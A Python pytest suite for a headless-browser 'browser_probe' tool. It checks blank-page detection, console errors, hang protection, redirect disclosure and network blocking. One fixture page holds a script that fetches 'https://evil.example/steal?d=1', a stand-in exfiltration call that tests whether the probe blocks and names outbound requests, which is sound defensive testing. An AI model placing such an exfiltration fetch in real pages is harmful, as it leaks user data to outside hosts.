"""browser_probe tests: contract honesty without playwright, real renders with it.

The playwright-gated half runs against REAL local HTML fixtures (content,
blank, JS-delayed, canvas-only, console errors, exfil attempts, blocking
main-thread loop) — the exact incident classes the tool exists to catch.
Gated tests skip cleanly when the optional `browser` extra or the Chromium
headless shell is absent.
"""

from __future__ import annotations

import os
import signal
import subprocess
import sys
import tempfile
import textwrap
import time
from pathlib import Path

import pytest

from abstractcore.tools import browser_tools
from abstractcore.tools.browser_tools import browser_probe


def _browser_ready() -> bool:
    """True when playwright AND its chromium binary are usable."""
    try:
        from playwright.sync_api import sync_playwright
    except Exception:
        return False
    try:
        with sync_playwright() as pw:
            path = pw.chromium.executable_path
        return bool(path) and Path(path).exists()
    except Exception:
        return False


_BROWSER_READY = _browser_ready()
needs_browser = pytest.mark.skipif(
    not _BROWSER_READY, reason="playwright/chromium not installed (optional `browser` extra)"
)


# ---------------------------------------------------------------------------
# Ungated: dependency honesty + argument contract (no browser needed)
# ---------------------------------------------------------------------------

def test_missing_playwright_message_is_actionable(monkeypatch):
    """Absent optional dep → BOTH install steps named (pip extra + browser
    binary), never a traceback or a bare ImportError."""
    monkeypatch.setattr(browser_tools, "_PLAYWRIGHT_AVAILABLE", False)
    out = browser_probe("index.html")
    assert 'pip install "abstractcore[browser]"' in out
    assert "playwright install --only-shell chromium" in out
    assert "--with-deps" in out  # the one per-OS branch (Linux system libs)


def test_target_not_found_names_the_flow(tmp_path):
    out = browser_probe(str(tmp_path / "missing.html"))
    assert "not found" in out
    assert "write the file first" in out


def test_target_directory_refused(tmp_path):
    out = browser_probe(str(tmp_path))
    assert "directory" in out


def test_unsupported_scheme_refused():
    out = browser_probe("javascript:alert(1)")
    assert "Unsupported target scheme" in out
    out2 = browser_probe("ftp://example.com/x.html")
    assert "Unsupported target scheme" in out2


def test_networkidle_refused_with_teaching(tmp_path):
    page = tmp_path / "p.html"
    page.write_text("<html><body>x</body></html>")
    out = browser_probe(str(page), wait_until="networkidle")
    assert "refused" in out
    assert "flaky by design" in out
    assert "domcontentloaded" in out  # names the valid alternative


def test_invalid_wait_until_names_valid_set(tmp_path):
    page = tmp_path / "p.html"
    page.write_text("<html><body>x</body></html>")
    out = browser_probe(str(page), wait_until="bogus")
    assert "Invalid wait_until" in out
    assert "load, domcontentloaded, commit" in out


def test_invalid_viewport_refused(tmp_path):
    page = tmp_path / "p.html"
    page.write_text("<html><body>x</body></html>")
    out = browser_probe(str(page), viewport="huge")
    assert "Invalid viewport" in out
    out2 = browser_probe(str(page), viewport="10x10")  # below the 64 floor
    assert "Invalid viewport" in out2


def test_empty_target_refused():
    out = browser_probe("   ")
    assert "target is empty" in out


# ---------------------------------------------------------------------------
# Gated: real headless renders over local fixtures
# ---------------------------------------------------------------------------

@needs_browser
def test_content_page_passes_all_checks(tmp_path):
    page = tmp_path / "ok.html"
    page.write_text(
        "<html><head><title>Snake</title></head>"
        "<body><h1>Hello Snake</h1><div id='board'>play</div></body></html>"
    )
    out = browser_probe(str(page), expect_selector="#board", expect_text="Hello")
    assert out.startswith("Browser probe: PASS")
    assert "✓ nonblank" in out
    assert "#board" in out and "✓" in out
    assert "title: 'Snake'" in out
    assert "Console: clean" in out


@needs_browser
def test_blank_page_fails_nonblank(tmp_path):
    page = tmp_path / "blank.html"
    page.write_text("<html><body></body></html>")
    out = browser_probe(str(page), timeout_s=4)
    assert out.startswith("Browser probe: FAIL")
    assert "✗ nonblank" in out
    assert "stayed blank" in out


@needs_browser
def test_js_delayed_content_passes(tmp_path):
    """The SPA class: empty body at load, content injected later — the
    auto-retrying content signal must catch it (never a sleep)."""
    page = tmp_path / "spa.html"
    page.write_text(
        "<html><body><script>"
        "setTimeout(()=>{document.body.innerHTML='<h1>Rendered late</h1>'},900)"
        "</script></body></html>"
    )
    out = browser_probe(str(page))
    assert out.startswith("Browser probe: PASS")
    assert "Rendered late" in out


@needs_browser
def test_canvas_only_page_is_not_blank(tmp_path):
    """A WebGL/canvas game has ZERO innerText and is not blank — the
    visual-element fallback keeps the nonblank predicate honest."""
    page = tmp_path / "canvas.html"
    page.write_text(
        "<html><body style='margin:0'><canvas id='c' width='400' height='300'></canvas>"
        "<script>document.getElementById('c').getContext('2d').fillRect(0,0,400,300)</script>"
        "</body></html>"
    )
    out = browser_probe(str(page))
    assert out.startswith("Browser probe: PASS")
    assert "Visual elements" in out


@needs_browser
def test_console_errors_reported_but_render_passes(tmp_path):
    """A page can render AND be broken — errors must surface without
    flipping the render verdict."""
    page = tmp_path / "errs.html"
    page.write_text(
        "<html><body><h1>renders</h1><script>"
        "console.error('boom cfg missing');throw new TypeError('x is not a function')"
        "</script></body></html>"
    )
    out = browser_probe(str(page))
    assert out.startswith("Browser probe: PASS")
    assert "1 error(s), 1 uncaught exception(s)" in out
    assert "boom cfg missing" in out
    assert "x is not a function" in out


@needs_browser
def test_local_target_blocks_and_names_outbound_requests(tmp_path):
    """The exfiltration posture: a local page's outbound requests (img src,
    fetch) are refused AND named in the report."""
    page = tmp_path / "exfil.html"
    page.write_text(
        "<html><body><h1>looks fine</h1>"
        "<img src='http://127.0.0.1:1/x.png'>"
        "<script>fetch('https://evil.example/steal?d=1').catch(()=>{})</script>"
        "</body></html>"
    )
    out = browser_probe(str(page))
    assert out.startswith("Browser probe: PASS")
    assert "network BLOCKED" in out
    assert "evil.example" in out


@needs_browser
def test_expect_selector_missing_fails(tmp_path):
    page = tmp_path / "p.html"
    page.write_text("<html><body><h1>hi</h1></body></html>")
    out = browser_probe(str(page), expect_selector="#nonexistent", timeout_s=3)
    assert out.startswith("Browser probe: FAIL")
    assert "not visible within budget" in out


@needs_browser
def test_expect_text_missing_fails(tmp_path):
    page = tmp_path / "p.html"
    page.write_text("<html><body><h1>hi</h1></body></html>")
    out = browser_probe(str(page), expect_text="Game Over", timeout_s=3)
    assert out.startswith("Browser probe: FAIL")
    assert "'Game Over'" in out
    assert "visible DOM text" in out


@needs_browser
def test_expect_text_miss_on_canvas_page_teaches_visual_verification(tmp_path):
    page = tmp_path / "canvas_text_probe.html"
    page.write_text(
        "<html><body style='margin:0'><canvas id='c' width='400' height='300'></canvas>"
        "<script>const c=document.getElementById('c').getContext('2d');"
        "c.fillRect(0,0,400,300);c.fillText('Game Over',20,40);</script>"
        "</body></html>"
    )
    out = browser_probe(str(page), expect_text="Game Over", timeout_s=4)
    assert out.startswith("Browser probe: FAIL")
    assert "not found in visible DOM text within budget" in out
    assert "`expect_text` checks visible DOM text only" in out
    assert "switch to `expect_selector` or screenshot/visual verification" in out


@needs_browser
def test_dead_server_is_a_verdict_not_an_exception():
    out = browser_probe("http://127.0.0.1:59999/", timeout_s=6)
    assert out.startswith("Browser probe: FAIL")
    assert "navigation failed" in out
    assert "ERR_CONNECTION_REFUSED" in out
    # Playwright's multi-line Call log trailer is stripped from the report.
    assert "Call log" not in out


@needs_browser
def test_blocking_main_thread_never_hangs(tmp_path):
    """The codex #14755 class: an infinite JS loop blocks the renderer main
    thread, which makes in-process CDP calls hang forever — the probe's
    wall-clock guarantee (subprocess hard kill) must hold."""
    page = tmp_path / "spin.html"
    page.write_text("<html><body><h1>pre</h1><script>while(true){}</script></body></html>")
    t0 = time.monotonic()
    out = browser_probe(str(page), timeout_s=4)
    elapsed = time.monotonic() - t0
    assert out.startswith("Browser probe: FAIL")
    assert "wall-clock budget" in out
    # budget (4s) + launch grace (12s) + a modest scheduling margin
    assert elapsed < 4 + browser_tools._LAUNCH_GRACE_S + 8, f"probe took {elapsed:.1f}s"


# NOTE: the original absolute-zero leak test (global `pgrep headless_shell`,
# 0.5s window) was removed — it asserted ZERO lingering browsers, so under the
# full serial suite it false-positived on a PRECEDING browser test still tearing
# down (the design reviewer's "passes by luck" finding, confirmed as a flake in
# the full run). It is superseded by two robust pins: the deterministic
# `test_hard_kill_tree_reaches_setsid_escaped_grandchild` (proves the tree-kill
# logic with no browser/self-heal timing) and the delta-based
# `test_no_orphan_browser_after_hard_kill_immediate` (after <= before).


@needs_browser
def test_screenshot_written_to_per_process_dir(tmp_path):
    page = tmp_path / "p.html"
    page.write_text("<html><body><h1>shot</h1></body></html>")
    out = browser_probe(str(page), capture_screenshot=True)
    # Declared-media sight lane (item 0836 / analyze_media escalation): when a screenshot is
    # captured, browser_probe returns a dict {"rendered": <report>, "media": [path]} so a
    # sight-lane host attaches the shot to the next model call; the report rides `rendered`.
    assert isinstance(out, dict), "a captured screenshot must be declared as a media output"
    assert isinstance(out.get("media"), list) and len(out["media"]) == 1
    rendered = out["rendered"]
    assert rendered.startswith("Browser probe: PASS")
    assert "Screenshot: " in rendered
    shot_line = next(ln for ln in rendered.splitlines() if ln.startswith("Screenshot: "))
    shot_path = Path(shot_line.split(" ", 1)[1].split(" (", 1)[0])
    assert shot_path.exists() and shot_path.stat().st_size > 0
    assert "abstractcore_browser_probe_" in str(shot_path)
    assert str(shot_path) == out["media"][0]  # the declared media IS the screenshot path
    assert "analyze_media" in rendered  # composition teaching (for text-only main models)


@needs_browser
def test_no_screenshot_returns_plain_string(tmp_path):
    """Opt-in: without capture_screenshot the return is the plain string report (byte-compatible
    with the pre-0836 contract) — only a captured screenshot triggers the media-declaring dict."""
    page = tmp_path / "p.html"
    page.write_text("<html><body><h1>hi</h1></body></html>")
    out = browser_probe(str(page))
    assert isinstance(out, str)
    assert out.startswith("Browser probe: PASS")


@needs_browser
def test_http_error_status_fails(tmp_path):
    """A rendering 404 page is still a FAIL — the agent probing its own
    server needs the status verdict."""
    import http.server
    import threading

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):  # noqa: N802
            body = b"<html><body><h1>Not here</h1></body></html>"
            self.send_response(404)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a):  # quiet
            pass

    srv = http.server.HTTPServer(("127.0.0.1", 0), Handler)
    port = srv.server_address[1]
    thread = threading.Thread(target=srv.serve_forever, daemon=True)
    thread.start()
    try:
        out = browser_probe(f"http://127.0.0.1:{port}/x", timeout_s=8)
        assert out.startswith("Browser probe: FAIL")
        assert "HTTP 404" in out
    finally:
        srv.shutdown()


@needs_browser
def test_timeout_budget_is_clamped(tmp_path):
    """timeout_s=0 / absurd values clamp to the 1..120 window instead of
    hanging forever or dying instantly."""
    page = tmp_path / "p.html"
    page.write_text("<html><body><h1>hi</h1></body></html>")
    out = browser_probe(str(page), timeout_s=0)
    assert out.startswith("Browser probe: PASS")
    assert "budget 1s" in out


# ---------------------------------------------------------------------------
# Adversary-fold pins (design reviewer, 2026-07-23)
# ---------------------------------------------------------------------------

def test_executor_tag_is_declared():
    """Cross-package contract (agent seam, commons c4932): the ReAct
    verifier's execution preference is DECLARATION-DRIVEN — it prefers tools
    carrying the 'executor' tag when composing a forced verification probe.
    browser_probe is exactly that class (execution catches what LLM-read
    review blesses); dropping the tag would silently demote the verifier to
    read-only review."""
    from abstractcore.tools.browser_tools import browser_probe as bp

    tags = list(getattr(bp, "_tool_definition", None).tags or [])
    assert "executor" in tags
    assert "write" in tags  # side-effect guard enrollment (agent's repeat-guard)


def test_local_cors_detector_keys_on_browser_error_not_fixtures():
    """P0 helper: the file:// CORS signature is detected from the browser's
    OWN error text (general-purpose), and never fires for http targets."""
    from abstractcore.tools.browser_tools import _local_file_cors_blocked

    cors = ["Access to script at 'file:///a.js' from origin 'null' has been blocked by CORS policy: "
            "Cross origin requests are only supported for protocol schemes: chrome, ..."]
    assert _local_file_cors_blocked(True, cors, []) is True
    assert _local_file_cors_blocked(False, cors, []) is False  # http target: never
    assert _local_file_cors_blocked(True, ["some unrelated warning"], []) is False


@needs_browser
def test_esm_module_local_file_flags_cors_not_broken_code(tmp_path):
    """P0: a local ES-module app renders empty under file:// CORS. The report
    must attribute the blank to the file:// limitation (serve over http), not
    let an agent conclude its working code is broken."""
    (tmp_path / "esm.html").write_text(
        '<html><body><div id="root"></div>'
        '<script type="module" src="./app.js"></script></body></html>'
    )
    (tmp_path / "app.js").write_text('document.getElementById("root").innerHTML="<h1>Loaded</h1>";')
    out = browser_probe(str(tmp_path / "esm.html"), timeout_s=5)
    assert out.startswith("Browser probe: FAIL")
    assert "file:// CORS" in out and "not your code" in out
    assert "python -m http.server" in out  # the actionable next step
    assert "blocked by CORS policy" in out  # the raw browser error is shown too


@needs_browser
def test_iframe_hosted_blank_discloses_top_frame_scope(tmp_path):
    """P1-1: content inside an iframe is invisible to the top-frame checks; a
    blank verdict must disclose that scope rather than imply the app is broken."""
    (tmp_path / "frame.html").write_text(
        '<html><body><iframe srcdoc="<h1>inside</h1>" width=300 height=200></iframe></body></html>'
    )
    out = browser_probe(str(tmp_path / "frame.html"), timeout_s=5)
    assert out.startswith("Browser probe: FAIL")
    assert "iframe" in out and "TOP frame only" in out


@needs_browser
def test_no_content_assertion_pass_is_qualified(tmp_path):
    """P1-2: require_nonblank=False with no expect_* proves only that
    navigation succeeded — the PASS must say so, never imply rendering."""
    (tmp_path / "blank.html").write_text("<html><body></body></html>")
    out = browser_probe(str(tmp_path / "blank.html"), require_nonblank=False, timeout_s=4)
    assert out.startswith("Browser probe: PASS")
    assert "navigation only — no content assertions" in out


@needs_browser
def test_redirect_is_disclosed(tmp_path):
    """P1-4: a silent 3xx renders + PASSes on the WRONG page unless disclosed."""
    import http.server
    import threading

    class Redir(http.server.BaseHTTPRequestHandler):
        def do_GET(self):  # noqa: N802
            if self.path == "/":
                self.send_response(302)
                self.send_header("Location", "/login")
                self.send_header("Content-Length", "0")
                self.end_headers()
            else:
                body = b"<html><body><h1>Login page</h1></body></html>"
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

        def log_message(self, *a):
            pass

    # ThreadingHTTPServer: a single-threaded server deadlocks against the
    # browser's keep-alive connection on the second (redirected) request.
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Redir)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        out = browser_probe(f"http://127.0.0.1:{port}/", expect_text="Login", timeout_s=8)
        assert out.startswith("Browser probe: PASS")
        assert "Redirected to:" in out and "/login" in out
    finally:
        srv.shutdown()


@needs_browser
def test_nav_timeout_names_actual_wait_until(tmp_path):
    """P2-1: the readyState-fallback line must name the chosen wait_until,
    not a hardcoded 'load'."""
    import http.server
    import threading

    class Slow(http.server.BaseHTTPRequestHandler):
        def do_GET(self):  # noqa: N802
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><body><h1>partial</h1>")
            self.wfile.flush()
            time.sleep(30)  # never completes the 'load'/'domcontentloaded' event

        def log_message(self, *a):
            pass

    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Slow)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        out = browser_probe(
            f"http://127.0.0.1:{port}/", wait_until="domcontentloaded", require_nonblank=False, timeout_s=3
        )
        assert "'domcontentloaded' event did not fire" in out
        assert "'load' event" not in out
    finally:
        srv.shutdown()


@needs_browser
def test_whitespace_only_body_is_blank(tmp_path):
    """Honest-behavior guarantee (unpinned before): a whitespace-only body is
    effectively blank → FAIL."""
    (tmp_path / "ws.html").write_text("<html><body>   \n\t   </body></html>")
    out = browser_probe(str(tmp_path / "ws.html"), timeout_s=4)
    assert out.startswith("Browser probe: FAIL")
    assert "nonblank" in out


@needs_browser
def test_expect_text_ignores_hidden_text(tmp_path):
    """Honest-behavior guarantee: expect_text matches VISIBLE text only
    (innerText excludes display:none), as the docstring claims."""
    (tmp_path / "hidden.html").write_text(
        '<html><body><h1>Visible</h1>'
        '<p style="display:none">SecretToken</p></body></html>'
    )
    ok = browser_probe(str(tmp_path / "hidden.html"), expect_text="Visible", timeout_s=4)
    assert ok.startswith("Browser probe: PASS")
    hidden = browser_probe(str(tmp_path / "hidden.html"), expect_text="SecretToken", timeout_s=4)
    assert hidden.startswith("Browser probe: FAIL")


@pytest.mark.skipif(os.name != "posix", reason="process-tree kill semantics are POSIX-specific")
def test_hard_kill_tree_reaches_setsid_escaped_grandchild():
    """P1-3 (deterministic, no browser): a grandchild that setsid()s into its
    OWN process group — exactly what chrome-headless-shell does — escapes
    os.killpg(worker_group). _hard_kill_tree must still reach it by ancestry.
    This replaces the shipped leak test that 'passed by luck' on self-heal."""
    from abstractcore.tools.browser_tools import _descendant_pids, _hard_kill_tree

    # The grandchild reports its OWN pid+pgid AFTER setsid() (avoids racing the
    # parent's read against the group change).
    code = textwrap.dedent(
        """
        import os, sys, time
        pid = os.fork()
        if pid == 0:
            os.setsid()          # escape into our own session/group
            sys.stdout.write(f"{os.getpid()} {os.getpgid(0)}\\n"); sys.stdout.flush()
            time.sleep(60)
            os._exit(0)
        time.sleep(60)
        """
    )
    proc = subprocess.Popen(
        [sys.executable, "-c", code], stdout=subprocess.PIPE, text=True, start_new_session=True
    )
    gc_pid_s, gc_pgid_s = proc.stdout.readline().split()
    grandchild_pid, grandchild_pgid = int(gc_pid_s), int(gc_pgid_s)
    try:
        # Precondition: the grandchild really escaped into its OWN group.
        assert grandchild_pgid == grandchild_pid  # it is its own group leader
        assert grandchild_pgid != os.getpgid(proc.pid)  # ≠ the worker's group
        # Ancestry walk finds it despite the group escape.
        assert grandchild_pid in _descendant_pids(proc.pid)

        _hard_kill_tree(proc)

        deadline = time.monotonic() + 3
        alive = True
        while time.monotonic() < deadline:
            try:
                os.kill(grandchild_pid, 0)
                time.sleep(0.05)
            except ProcessLookupError:
                alive = False
                break
        assert not alive, "the setsid-escaped grandchild survived the tree kill (leak)"
    finally:
        for pid in (grandchild_pid, proc.pid):
            try:
                os.kill(pid, signal.SIGKILL)
            except Exception:
                pass


@needs_browser
def test_no_orphan_browser_after_hard_kill_immediate(tmp_path, monkeypatch):
    """P1-3 integration: after a hard-killed probe, OUR probe's browser leaves
    no orphan. Fingerprinted via a unique TMPDIR (chromium's --user-data-dir
    lands under it) so the check is IMMUNE to concurrent playwright agents on
    the same machine — the verification reviewer proved a plain system-wide
    pgrep is contaminable and false-FAILs (or masks a real leak)."""
    uniq = tempfile.mkdtemp(prefix="bp_leak_fp_")
    monkeypatch.setenv("TMPDIR", uniq)  # inherited by the probe subprocess → chromium profile lands here

    page = tmp_path / "spin.html"
    page.write_text("<html><body><h1>x</h1><script>while(true){}</script></body></html>")

    def our_browsers():
        r = subprocess.run(["pgrep", "-fl", "chrome-headless|headless_shell"], capture_output=True, text=True)
        return [ln for ln in (r.stdout or "").splitlines() if uniq in ln]

    assert our_browsers() == []  # nothing ours before (unique fingerprint)
    browser_probe(str(page), timeout_s=3)
    # Absolute zero of OUR fingerprinted browsers is safe now (no other agent
    # uses this TMPDIR); poll briefly for SIGKILL zombie-reap lag.
    deadline = time.monotonic() + 3
    while our_browsers() and time.monotonic() < deadline:
        time.sleep(0.1)
    assert our_browsers() == [], f"our browser leaked after hard kill: {our_browsers()}"


@needs_browser
def test_direct_200_slashless_target_does_not_claim_redirect(tmp_path):
    """P1-A: a direct 200 on a SLASHLESS host (the tool's own documented
    example shape) must NOT report a phantom 'Redirected to' from Chromium's
    trailing-slash normalization."""
    import http.server
    import threading

    class Direct(http.server.BaseHTTPRequestHandler):
        def do_GET(self):  # noqa: N802
            body = b"<html><body><h1>Home</h1></body></html>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a):
            pass

    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Direct)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        out = browser_probe(f"http://127.0.0.1:{port}", timeout_s=8)  # no trailing slash
        assert out.startswith("Browser probe: PASS")
        assert "Redirected to:" not in out
    finally:
        srv.shutdown()


def test_urls_equivalent_ignores_browser_normalization():
    """P1-A helper: normalization differences are NOT redirects; a real path
    change IS."""
    from abstractcore.tools.browser_tools import _urls_equivalent

    assert _urls_equivalent("http://h:8000", "http://h:8000/")  # trailing slash
    assert _urls_equivalent("http://h/a b", "http://h/a%20b")  # percent-encoding
    assert _urls_equivalent("HTTP://H:8000/", "http://h:8000/")  # scheme/host case
    assert _urls_equivalent("http://h/x#frag", "http://h/x")  # fragment ignored
    assert not _urls_equivalent("http://h/", "http://h/login")  # real redirect
    assert not _urls_equivalent("http://h/", "http://other/")  # different host


@needs_browser
def test_allow_network_local_target_reports_allowed_not_blocked(tmp_path):
    """P1-B: with allow_network=True no route is installed and requests go
    out — the report must NOT claim the sandbox blocked them (a false security
    claim in the exact posture the guard is named for)."""
    (tmp_path / "p.html").write_text("<html><body><h1>ok</h1></body></html>")
    out = browser_probe(str(tmp_path / "p.html"), allow_network=True, timeout_s=5)
    assert "network ALLOWED" in out
    assert "network blocked" not in out.lower()


@needs_browser
def test_never_responding_server_reports_no_commit_not_infinite_loop(tmp_path):
    """P2-B: a server that accepts the connection but never responds must get
    an honest 'no response committed' verdict within budget — NOT a hard-kill
    misdiagnosed as an infinite JS loop (the snapshot would hang otherwise)."""
    import http.server
    import threading

    class NoResp(http.server.BaseHTTPRequestHandler):
        def do_GET(self):  # noqa: N802
            time.sleep(30)  # accept, never respond

        def log_message(self, *a):
            pass

    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), NoResp)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        t0 = time.monotonic()
        out = browser_probe(f"http://127.0.0.1:{port}/", timeout_s=4)
        elapsed = time.monotonic() - t0
        assert out.startswith("Browser probe: FAIL")
        assert "no response committed" in out
        assert "infinite" not in out  # not misdiagnosed as a JS loop
        # Returned near budget, not dragged to budget+grace by a hung snapshot.
        assert elapsed < 4 + browser_tools._LAUNCH_GRACE_S, f"took {elapsed:.1f}s"
    finally:
        srv.shutdown()
